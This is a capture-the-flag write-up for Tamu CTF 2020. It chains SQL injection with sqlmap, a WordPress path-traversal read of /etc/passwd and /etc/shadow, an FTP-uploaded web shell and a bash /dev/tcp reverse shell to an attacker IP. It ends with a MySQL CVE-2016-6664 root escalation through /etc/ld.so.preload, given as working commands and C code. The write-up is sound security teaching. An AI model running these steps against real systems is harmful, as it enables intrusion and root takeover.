Title: MySQL CVE-2016-6663 and CVE-2016-6664 in action
Author: Sander
Date: 2020-03-26 01:29
Slug: tamu-ctf-2020-password-mismanagers
Category: CTF
Tags: exploit
Summary: CTF challenge "Password Mismanagers"

A fun CTF challenge I did for Tamu CTF 2020 that involves a SQL injection, local file inclusion vulnerability, poppin' a shell, and exploiting an old MySQL exploit in order to gain root.

- CTF link: [Tamu CTF 2020](https://ctftime.org/event/1009/)
- CTF date: Fri, 20 March 2020, 00:30 UTC — Mon, 30 March 2020, 00:30 UTC
- CTF type: Jeopardy

Originally posted on [spotless.tech](https://spotless.tech)

## Recon

The challenge description is rather short, we discover a running machine on `172.30.0.2` using [nmap](https://nmap.org/).

```
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 3.0.2
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
3306/tcp open  mysql   syn-ack ttl 64 MySQL (unauthorized)
8000/tcp open  http    syn-ack ttl 64 PHP cli server 5.4
```

### Password manager

Port 8000 exposes a web application called [Password Manager](https://github.com/dumbape/Password-Manager/) on `http://172.30.0.2/login.php` which is vulnerable to SQLi.

We dump credentials from the `passwords` table using [sqlmap](http://sqlmap.org/):

```bash
python sqlmap.py --threads 3 \
                 --dbms mysql \
                 --random-agent \
                 --time-sec 2 \
                 -u "http://172.30.0.2:8000/login.php" \
                 --data "email=admin@akrondin.com*&pass=&submit=login" \
                 -D pmanager -T passwords --dump
```

```
+----+---------+---------+--------------------+----------------+
| ID | loginid | name    | user               | password       |
+----+---------+---------+--------------------+----------------+
| 1  | bigsbee | bigsbee | admin@akrondin.com | F54gB76&KxpF%3 |
| 3  | admin   | admin   | admin@akrondin.com | jF5t^3dW3dxh!  |
+----+---------+---------+--------------------+----------------+
```

### Wordpress

Port 80 exposes a Wordpress instance. [WPScan]() reveals some plugins, including:

```
[+] download-shortcode
 | Location: http://172.30.0.2/wp-content/plugins/download-shortcode/
 | Latest Version: 1.1 (up to date)
 | Last Updated: 2015-04-21T22:18:00.000Z
```

This plugin is vulnerable to [exploit-db.com/exploits/344360](https://www.exploit-db.com/exploits/344360) - local file inclusion:

```
http://172.30.0.2/wp-content/force-download.php?file=../../../../../../../../../../../../etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
[...]
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
bigsbee:x:1000:1000::/home/bigsbee:/bin/bash
mysql:x:999:998:MySQL server:/var/lib/mysql:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
```

We can also read `/etc/shadow`:

```
root:$6$5tBVYnpH$ChxoBEz7EDs1WXgg0o4w7OeuvLqqQ2/y2vuwVJejgYZcKSYMJKho1/FVjd6bfpjh3jzUMwvl3LVW2yWTCb4k70:18342:0:99999:7:::
bigsbee:$6$WDoRe/.zHOv/gQc$u69q8txq.J3D6hM7.381itc50zFi1XAiBORuKre2/V6vQ9veuP9RdzAO.nVj3xIH.runqMYE2eA0bOEYPx1.U1:18342:0:99999:7:::
mysql:$6$0rSReEeLL$eJFfn7ibz94pn7qKayR9aLNE4NtRF7EhCm8u1VcFnBZZhmGZPSPYzGrsKdaE.D5l3ucYAyn9OfPt6vI7iUzUi/:18342::::::
apache:!!:18342::::::
```

And `wp-settings.php` while we're at it:

```php7
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'G53DF76gd21$');
```

## vsftpd

We can try the credentials we obtained from the Password Manager SQLi on the FTP server:

```bash
lftp bigsbee@172.30.0.2
```

Using `bigsbee:F54gB76&KxpF%3`

```
cd ok, cwd=/var/ftp/pub
lftp bigsbee@172.30.0.2:~> ls -al
drwxrwxrwx    1 0        0            4096 Oct 30  2018 .
drwxr-xr-x    1 0        0            4096 Mar 21 23:02 ..
```

We're able to traverse the filesystem and find ourselves a writeable directory (the Wordpress `wp-content` directory) where we can upload a shell for RCE:

```
lftp bigsbee@172.30.0.2:~> cd /var/www/html/wp-content
cd ok, cwd=/var/www/html/wp-content
lftp bigsbee@172.30.0.2:/var/www/html/wp-content> put hax.php
799 bytes transferred in 2 seconds (532 B/s)
```

We'll use the following for a reverse shell:

```bash
echo 'F54gB76&KxpF%3' | su - bigsbee -c "nohup bash -i >& /dev/tcp/172.30.0.12/1337 0>&1 &"
```

And listen locally for the incoming connection:

```bash
nc -lp 1337
```

```
bash: no job control in this shell
[bigsbee@917d912f6467 ~]$ export TERM=xterm
[bigsbee@917d912f6467 ~]$ id
uid=1000(bigsbee) gid=1000(bigsbee) groups=1000(bigsbee)
```

The box is running Centos 7.7.

## MySQL 5.5.51

To re-cap, we've collected 3 passwords so far:

- `bigsbee:F54gB76&KxpF%3`
- `admin:jF5t^3dW3dxh!`
- `wordpressuser:G53DF76gd21$`

And apparently the system user `mysql` has a password set (as seen from `/etc/shadow`), and password `G53DF76gd21$` works on that:

```
[bigsbee@917d912f6467 ~]$ echo 'G53DF76gd21$' | su - mysql -c "id"
Password: uid=999(mysql) gid=998(mysql) groups=998(mysql)
```

In addition, MySQL version `5.5.51` is vulnerable to some exploits, read about them here:

- [MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662](http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html)
- [MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663](http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)
- [MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664](http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html)

### Exploiting locally

To further investigate the possibly of exploiting this vulnerability we'll mimick the remote locally using docker. The reader may follow these instructions for practice at home.

Create a `Dockerfile`:

```dockerfile
FROM centos:7.7.1908
RUN echo "gigem{spotless}" > /root/flag
RUN yum --nogpgcheck -y install yum-utils wget vim which gcc gcc-c++ make autoconf build-essential unzip zip

RUN wget https://cdn.mysql.com/archives/mysql-5.5/MySQL-server-5.5.51-1.el7.x86_64.rpm -O /tmp/mysql.rpm
RUN yum --nogpgcheck -y install /tmp/mysql.rpm
RUN wget https://cdn.mysql.com/archives/mysql-5.5/MySQL-client-5.5.51-1.el7.x86_64.rpm -O /tmp/client.rpm
RUN yum --nogpgcheck -y install /tmp/client.rpm


CMD ["/bin/bash"]
```

Build and run the container:

```bash
docker pull centos:7.7.1908
docker build -t tamu_mysql .
docker run -it tamu_mysql
```

### Exploit

On the challenge server, the MySQL process tree looks like this:

```bash
root    14  11704  2724  /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --pid-file=/var/lib/mysql/917d912f6467.pid
mysql  107  594848 63192  /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql ...
```

> The default MySQL package comes with a mysqld_safe script which is used by many
default installations/packages of MySQL as a wrapper to start the MySQL service
process which can observed,

The main takeaway is that `mysqld_safe` monitors the `mysqld` process and will restart `mysqld` when it is killed. The `mysqld_safe` wrapper script is executed as root, whereas the
main `mysqld` process drops its privileges to mysql user.

Inside our docker container we'll start `mysqld_safe` with the same arguments as on the challenge server:

```bash
nohup /usr/bin/mysqld_safe --datadir=/var/lib/mysql --pid-file=/var/lib/mysql/be2b8151db0e.pid &
```

We then switch to the mysql user and view `mysql`'s home directory.

```bash
su mysql

cd ~/
ls -al /var/lib/mysql
total 28724
drwxr-xr-x 1 mysql mysql     4096 Mar 23 18:08 .
drwxr-xr-x 1 root  root      4096 Mar 23 01:57 ..
-rw------- 1 mysql mysql       64 Mar 23 18:08 .bash_history
-rw-r--r-- 1 root  root       111 Mar 23 01:57 RPM_UPGRADE_HISTORY
-rw-r--r-- 1 mysql mysql      111 Mar 23 01:57 RPM_UPGRADE_MARKER-LAST
-rw-rw---- 1 mysql mysql        4 Mar 23 18:08 be2b8151db0e.pid
-rw-r----- 1 mysql root      1969 Mar 23 18:08 ddf4bcd52d7c.err
[...]
```

As outlined in the CVE advisories, we'll try to achieve privilege escalation in the following steps:

1. Delete the error logfile, which is called `ddf4bcd52d7c.err` in our case.
2. Create a symlink called `ddf4bcd52d7c.err` that links to `/etc/ld.so.preload`
3. Create a shared library that will append a setuid bit to `/bin/bash`
4. `kill -9` the `mysql` process, at which point `mysqld_safe` will notice the process is down and restart it.
5. Our hook kicks in, and alters `/bin/bash` as root.

Create our hook; `/var/lib/mysql/chmod.c`:

```c
__attribute__((constructor)) void constructor(void) { chmod("/bin/bash", 04755); }
```

Compile it:

```bash
$ gcc -shared -fPIC -o chmod.so chmod.c
```

Delete the error log:

```bash
rm ddf4bcd52d7c.err
```

Create a symlink that links to `/etc/ld.so.preload`

```bash
ln -s /etc/ld.so.preload /var/lib/mysql/ddf4bcd52d7c.err
```

Verify the symlink exists:

```
lrwxrwxrwx 1 mysql mysql       18 Mar 23 18:12 ddf4bcd52d7c.err -> /etc/ld.so.preload
```

Restart MySQL. It will create a `/etc/ld.so.preload` file owned by `mysql`. Make sure to kill `mysqld`, and **not** `mysqld_safe`:

```bash
kill -9 114
```

We observe that `/etc/ld.so.preload` has been created:

```
-rw-r----- 1 mysql root 19900 Mar 23 18:45 /etc/ld.so.preload
```

Since we now own `/etc/ld.so.preload` with the `mysql` user we can simply echo the path to our library.

```bash
echo '/var/lib/mysql/chmod.so' > /etc/ld.so.preload
```

Restart MySQL one final time.

```bash
kill -9 164
```

And notice `/bin/bash` now has a setuid bit set:

```
-rwsr-xr-x 1 root root 964600 Aug  8  2019 /bin/bash
```

We can use bash to get a root shell:

```bash
$ /bin/bash -p

$ id
uid=999(mysql) gid=998(mysql) euid=0(root) groups=998(mysql)

$ whoami
root
```

Flag can be found at `/root/flag`

### Flag

`two_six{c0n6r475_y0u_f0und_7h3_fl46_f8b9d92d6e96358087ad512cf062cee1}`